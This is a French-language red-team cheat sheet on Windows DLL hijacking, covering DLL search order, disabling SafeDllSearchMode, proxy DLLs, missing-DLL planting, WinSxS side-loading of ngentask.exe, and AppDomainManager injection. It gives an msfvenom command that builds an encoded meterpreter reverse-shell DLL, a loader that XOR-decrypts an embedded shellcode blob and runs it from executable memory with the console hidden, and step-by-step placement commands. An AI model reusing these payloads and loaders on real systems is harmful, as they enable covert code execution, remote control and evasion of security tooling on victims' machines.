
- [[#DLL search order]]
- [[#Désactiver le Safe DLL Search Mode]]
- [[#Tools pour identifier les DLL chargées par un programme]]
- [[#Créer une DLL malveillante avec MSFVENOM]]
- [[#Déterminer les fonctions à modifier dans la DLL]]
- [[#Invalid DLL]]
- [[#DLL Side-Loading]]
- [[#AppDomainManager]]

---
# DLL search order

Lorsqu'il tente de localiser une DLL, Windows utilise l'ordre de recherche suivant par défaut (**Safe DLL Search Mode**).

1. Le répertoire à partir duquel l'application a été chargée.
2. Le répertoire système `C:\Windows\System32` pour les systèmes 64 bits.
3. Le répertoire système 16 bits `C:\Windows\System` (non supporté sur les systèmes 64 bits)
4. Le répertoire Windows.
5. Le répertoire courant.
6. Tous les répertoires répertoriés dans la variable d'environnement PATH.

Si le **Safe DLL Search Mode** est désactivé, alors l'ordre devient le suivant.

1. Le répertoire à partir duquel l'application est chargée.
2. **Le répertoire courant.**
3. Le répertoire système.
4. Le répertoire système 16 bits.
5. Le répertoire Windows
6. Les répertoires listés dans la variable d'environnement PATH.

---
# Désactiver le Safe DLL Search Mode

Nécessite les droits d'ecriture sur la clé `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager`

1. Appuyez sur `Touche Windows + R` pour ouvrir la boîte de dialogue Exécuter.
2. Tapez `Regedit` et appuyez sur `Entrée`. Cela ouvrira l'Éditeur du Registre.
3. Naviguez jusqu'à `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager`.
4. Dans le panneau de droite, recherchez la valeur `SafeDllSearchMode`. Si elle n'existe pas, cliquez avec le bouton droit de la souris sur l'espace vide du dossier ou cliquez avec le bouton droit de la souris sur le dossier `Session Manager`, sélectionnez `New` (Nouveau) et ensuite `DWORD (32-bit) Value` (Valeur DWORD (32-bit)). Nommez cette nouvelle valeur `SafeDllSearchMode`.
5. Double-cliquez sur `SafeDllSearchMode`. Dans le champ de données Value, entrez `1` pour activer et `0` pour désactiver Safe DLL Search Mode.
6. Cliquez sur « OK », fermez l'Editeur de Registre et redémarrez le système pour que les changements prennent effet.
---
# Tools pour identifier les DLL chargées par un programme :

1. Process Explorer : Cet outil, qui fait partie de la suite Sysinternals de Microsoft, fournit des informations détaillées sur les processus en cours d'exécution, y compris les DLL chargées. En sélectionnant un processus et en inspectant ses propriétés, vous pouvez visualiser ses DLL.
2. PE Explorer : Cet explorateur de Portable Executable (PE) permet d'ouvrir et d'examiner un fichier PE (tel qu'un .exe ou un .dll). Il révèle notamment les DLL à partir desquelles le fichier importe des fonctionnalités.
3. Procmon -> Filter -> Operation is Load Image
4. VirusTotal : Dans les modules chargés

---

# Créer une DLL malveillante avec MSFVENOM

Staged Windows x64 meterpreter reverse #DLL

```BASH
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x86/shikata_ga_nai -i 10 -f dll > charge.dll
```

---
# Déterminer les fonctions à modifier dans la DLL

1. Ouvrir le programme dans Ghidra et identifier les fonctions importés par la DLL

## Proxying (Hijack)

Nous pouvons utiliser une méthode connue sous le nom de DLL Proxying pour exécuter un Hijack. Nous allons créer une nouvelle bibliothèque qui chargera la fonction à partir de la dll, la modifiera et la renverra au programme.

1. Créer une nouvelle DLL : Nous allons créer une nouvelle DLL qui servira de proxy pour la dll. Cette bibliothèque contiendra le code nécessaire pour charger la fonction  de la dll et effectuer l'altération requise.
2. Chargement de la fonction : Dans la nouvelle DLL, nous chargerons la fonction à partir du fichier DLL d'origine. Cela nous permettra d'accéder à la fonction d'origine.
3. Falsifier la fonction : Une fois la fonction chargée, nous pouvons appliquer les altérations ou modifications souhaitées à son résultat.
4. Retourner la fonction modifiée : Après avoir terminé le processus d'altération, nous renverrons la fonction modifiée de la nouvelle bibliothèque au programme. Ainsi, lorsque le programme appellera la fonction, il exécutera la version modifiée avec les changements prévus.

Exemple avec fonction Add de la DLL library.dll -> Création de tamper.dll

```c
// tamper.c
#include <stdio.h>
#include <Windows.h>

#ifdef _WIN32
#define DLL_EXPORT __declspec(dllexport)
#else
#define DLL_EXPORT
#endif

typedef int (*AddFunc)(int, int);

DLL_EXPORT int Add(int a, int b)
{
    // Load the original library containing the Add function
    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
    if (originalLibrary != NULL)
    {
        // Get the address of the original Add function from the library
        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
        if (originalAdd != NULL)
        {
            printf("============ HIJACKED ============\n");
            // Call the original Add function with the provided arguments
            int result = originalAdd(a, b);
            // Tamper with the result by adding +1
            printf("= Adding 1 to the sum to be evil\n");
            result += 1;
            printf("============ RETURN ============\n");
            // Return the tampered result
            return result;
        }
    }
    // Return -1 if the original library or function cannot be loaded
    return -1;
}
```

Compiler la lib et renommer la lib hijackée en library.o.dll, puis renommer tamper.dll en library.dll

---
# Invalid DLL

1. Identifier les DLL non trouvées

Dans procmon -> Filter -> Result is NAME NOT FOUND -> Path ends with .dll 

2. Créer point d'entrée DLL Main qui est automatiquement appelé par Windows lors du chargement de la DLL.

```c
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
       unsigned char shellcode[] = "...";
    }
    break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```


3. Compiler et renommer la dll

Si besoin d'intégrer les fonctions de la DLL d'origine
### Automatisation avec DLLLirant

https://github.com/redteamsocietegenerale/DLLirant

---
# DLL Side-Loading

Windows Component Store à la rescousse !

Le Windows Component Store situé dans ***C:\Windows\WinSxS*** permet à plusieurs versions d'un programme de cohabiter sur le système. Lors d'une mise à jour Windows Update, l'ancienne version du programme n'est pas supprimée mais reste stockée dans ce répertoire, ce qui laisse une porte ouverte au DLL side loading pour un programme vulnérable.

L'idée est d'exécuter le programme situé dans **C:\Windows\WinSxS** et profiter du DLL search path order pour mettre une DLL malveillante dans notre répertoire courant.

Exemple avec ngentask.exe :

1. Identifier la présence du programme cible dans le Windows Component Store

```powershell
ls -Path C:\Windows\WinSxS -Recurse -Filter ngentask.exe | Select -expand FullName
```

2. Lancer procmon et executer le programme afin d'identifier qu'il cherche des dll manquantes -> Filter -> Result is NAME NOT FOUND -> Path ends with .dll  

```powershell
C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe
```

![[Pasted image 20250911004953.png]]

3. Créer la DLL manquante
	Template de DLL -> https://github.com/FuzzySecurity/DLL-Template
	ou 
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <iostream>

unsigned char code[] = "\xb7\xa3\xc4\x4b\x4b\x4b\x2b\x7a\x99\xc2\xae\x2f\xc0\x19\x7b\xc0\x19\x47\xc0\x19\x5f\x44\xfc\x01\x6d\x7a\xb4\xc0\x39\x63\x7a\x8b\xe7\x77\x2a\x37\x49\x67\x6b\x8a\x84\x46\x4a\x8c\x02\x3e\xa4\x19\xc0\x19\x5b\xc0\x09\x77\x1c\x4a\x9b\xc0\x0b\x33\xce\x8b\x3f\x07\x4a\x9b\x1b\xc0\x03\x53\xc0\x13\x6b\x4a\x98\xce\x82\x3f\x77\x7a\xb4\x02\xc0\x7f\xc0\x4a\x9d\x7a\x8b\x8a\x84\x46\xe7\x4a\x8c\x73\xab\x3e\xbf\x48\x36\xb3\x70\x36\x6f\x3e\xab\x13\xc0\x13\x6f\x4a\x98\x2d\xc0\x47\x00\xc0\x13\x57\x4a\x98\xc0\x4f\xc0\x4a\x9b\xc2\x0f\x6f\x6f\x10\x10\x2a\x12\x11\x1a\xb4\xab\x13\x14\x11\xc0\x59\xa2\xcb\xb4\xb4\xb4\x16\x23\x78\x79\x4b\x4b\x23\x3c\x38\x79\x14\x1f\x23\x07\x3c\x6d\x4c\xc2\xa3\xb4\x9b\xf3\xdb\x4a\x4b\x4b\x62\x8f\x1f\x1b\x23\x62\xcb\x20\x4b\xb4\x9e\x21\x41\x23\x8b\xe3\x4a\x51\x23\x49\x4b\x4a\xf0\xc2\xad\x1b\x1b\x1b\x1b\x0b\x1b\x0b\x1b\x23\xa1\x44\x94\xab\xb4\x9e\xdc\x21\x5b\x1d\x1c\x23\xd2\xee\x3f\x2a\xb4\x9e\xce\x8b\x3f\x41\xb4\x05\x43\x3e\xa7\xa3\x2c\x4b\x4b\x4b\x21\x4b\x21\x4f\x1d\x1c\x23\x49\x92\x83\x14\xb4\x9e\xc8\xb3\x4b\x35\x7d\xc0\x7d\x21\x0b\x23\x4b\x5b\x4b\x4b\x1d\x21\x4b\x23\x13\xef\x18\xae\xb4\x9e\xd8\x18\x21\x4b\x1d\x18\x1c\x23\x49\x92\x83\x14\xb4\x9e\xc8\xb3\x4b\x36\x63\x13\x23\x4b\x0b\x4b\x4b\x21\x4b\x1b\x23\x40\x64\x44\x7b\xb4\x9e\x1c\x23\x3e\x25\x06\x2a\xb4\x9e\x15\x15\xb4\x47\x6f\x44\xce\x3b\xb4\xb4\xb4\xa2\xd0\xb4\xb4\xb4\x4a\x88\x62\x8d\x3e\x8a\x88\xf0\xab\x56\x61\x41\x23\xed\xde\xf6\xd6\xb4\x9e\x77\x4d\x37\x41\xcb\xb0\xab\x3e\x4e\xf0\x0c\x58\x39\x24\x21\x4b\x18\xb4\x9e\x4b";

int decrypt()
{
	char key = 'K';
	int i = 0;
	for (i; i < sizeof(code) - 1; i++)
	{
		code[i] = code[i] ^ key;
	}
	return 0;
}

VOID MyPayload() 
{
	decrypt();

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	HANDLE mem_handle = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(code), NULL);

	void* mem_map = MapViewOfFile(mem_handle, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0x0, 0x0, sizeof(code));

	std::memcpy(mem_map, code, sizeof(code));

	std::cout << ((int(*)())mem_map)() << std::endl;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        MyPayload();
		break;
    }
    break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```

4. Compiler la DLL et la nommer mscorsvc.dll dans notre cas.

	Avec visual studio 2022
	
```powershell
cl /LD mscorsvc.c
```


5. La placer dans notre répertoire courant.
6. Exécuter le programme.

```powershell
C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe
```

![[Pasted image 20250911005050.png]]

---
# AppDomainManager


Méthode permettant de forcer les applications .NET à charger une DLL peu importe l'ordre de recherche. Fonctionne sur les applications écrites en .NET Core 3.1 ou +.


1. Ecrire la classe suivante AppDomainHijack

```C#
using System;
using System.Windows.Forms;

namespace AppDomainHijack;

public sealed class DomainManager : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        MessageBox.Show("Hello World", "Success");
    }
}
```

2. La compiler en .dll .NET (Bibliothèque de classe dans Visual Studio)

3. La placer dans le même répertoire que le programme

```powershell
cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe ngentask.exe
cp C:\Tools\AppDomainHijack\bin\Debug\AppDomainHijack.dll domainManager.dll
```

4. Définir les variables d'environnement APPDOMAIN_MANAGER_ASM et APPDOMAIN_MANAGER_TYPE

```powershell
$env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
```

5. Exécuter le programme

![[Pasted image 20250911012627.png]]

Alternative avec fichier .config (doit être précédé du nom du programme) contenant les éléments **appDomainManagerAssembly** et **appDomainManagerType**

ngentask.exe.config

```.config
<configuration>
   <runtime>
      <appDomainManagerAssembly value="AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />  
      <appDomainManagerType value="AppDomainHijack.DomainManager" />  
   </runtime>
</configuration>
```